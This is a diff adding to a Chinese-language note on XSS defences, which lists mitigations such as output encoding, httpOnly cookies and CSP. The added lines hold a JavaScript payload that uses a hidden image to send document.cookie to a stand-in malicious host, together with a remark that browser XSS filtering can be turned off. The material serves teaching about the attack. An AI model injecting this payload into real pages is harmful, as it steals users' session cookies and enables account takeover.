@@ -27,3 +27,14 @@
 4. 对动态输出到页面的内容进行HTML编码
 5. 服务端对敏感的Cookie设置 httpOnly属性，使js脚本不能读取到cookie
 6. CSP 即是 Content Security Policy
+
+```
+var img = document.createElement('img');
+img.src='http://www.xss.com?cookie='+document.cookie;
+img.style.display='none';
+document.getElementsByTagName('body')[0].appendChild(img);
+
+这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
+```
+
+目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段xss攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭
